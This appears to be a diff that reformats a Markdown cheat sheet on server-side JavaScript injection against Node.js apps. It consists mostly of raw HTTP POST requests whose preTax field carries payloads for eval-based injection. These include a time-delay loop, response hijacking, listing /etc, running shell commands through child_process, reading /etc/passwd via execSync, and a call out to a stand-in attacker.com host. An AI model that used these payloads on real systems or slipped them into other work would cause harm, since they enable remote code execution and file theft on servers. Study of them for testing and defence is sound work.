@@ -1,12 +1,19 @@
-Vulnerable code:
+# SSJS Injection
+
+## Vulnerable code:
+```
 var pretax = eval(req.body.preTax);
 exec(`ls -l ${folder}`, (error, stdout, stderr) => { ...
+```
 
-Example:
+## Example:
+```
 confidence_level=;console.log('injected');
 require('http').get('http://attacker.com')
+```
 
-Time delay for 10 seconds:
+## Time delay for 10 seconds:
+```
 POST /contributions HTTP/1.1
 Host: 192.168.2.159:5000
 Cookie: connect.sid=..snip..
@@ -19,9 +26,10 @@ var d=new Date();
 do{
 cd=new Date();
 }while(cd-d<10000)
+```
 
-
-Write output into a response:
+## Write output into a response:
+```
 POST /contributions HTTP/1.1
 Host: 192.168.2.159:5000
 Cookie: connect.sid=..snip..
@@ -29,9 +37,10 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 38
  
 preTax=1;response.end('testvalue9000')
+```
 
-
-If --> ReferenceError: response is not defined --> try:
+## If --> ReferenceError: response is not defined --> try:
+```
 POST /contributions HTTP/1.1
 Host: 192.168.2.159:5000
 Cookie: connect.sid=..snip..
@@ -39,9 +48,10 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 33
  
 preTax=1;res.end('testvalue9000')
+```
 
-
-Directory listing:
+## Directory listing:
+```
 POST /contributions HTTP/1.1
 Host: 192.168.2.159:5000
 Cookie: connect.sid=..snip..
@@ -49,9 +59,10 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 64
  
 preTax=1;res.end(require('fs').readdirSync('/etc').toString())
+```
 
-
-Blindly execute a command:
+## Blindly execute a command:
+```
 POST /contributions HTTP/1.1
 Host: 192.168.2.159:5000
 Cookie: connect.sid=..snip..
@@ -61,9 +72,10 @@ Content-Length: 88
 preTax=1;
 var exec = require('child_process').exec; 
 var out = exec('touch /tmp/q234f');
+```
 
-
-With Stdout:
+## With Stdout:
+```
 POST /contributions HTTP/1.1
 Host: 192.168.2.159:5000
 Cookie: connect.sid=..snip..
@@ -77,12 +89,13 @@ cat.stdout.on('data', function(data) {
 fs.writeFile('/tmp/sddfr.txt', data)}); 
 var out = fs.readFileSync('/tmp/sddfr.txt'); 
 res.write(out); res.end()
+```
 
-The first time may see see an “Error: ENOENT, no such file or directory ‘/tmp/sddfr.txt’” message. The reason for this is the asynchronous nature of Node.js.
+The first time may see see an “Error: ENOENT, no such file or directory ‘/tmp/sddfr.txt’” message. The reason for this is the asynchronous nature of Node.js.  
 An alternative approach would be to keep the file within the Node.js application directory (e.g. replace /tmp/sddfr.txt with sddfr.txt in the example below.)
 
-
-execSync in Node.js v0.12:
+## execSync in Node.js v0.12:
+```
 POST /contributions HTTP/1.1
 Host: 192.168.2.159:5000
 Cookie: connect.sid=..snip..
@@ -92,9 +105,10 @@ Content-Length: 86
 preTax=2;
 var asd = require('child_process').execSync('cat /etc/passwd');
 res.write(asd)
+```
 
-
-Other version of Node.js:
+## Other version of Node.js:
+```
 POST /contributions HTTP/1.1
 Host: 192.168.2.159:5000
 Cookie: connect.sid=..snip..
@@ -108,3 +122,4 @@ cat.stdout.on('data', function(data) {
 fs.writeFile('/tmp/sddfr.txt', data)}); 
 var out = fs.readFileSync('/tmp/sddfr.txt'); 
 res.write(out); res.end()
+```
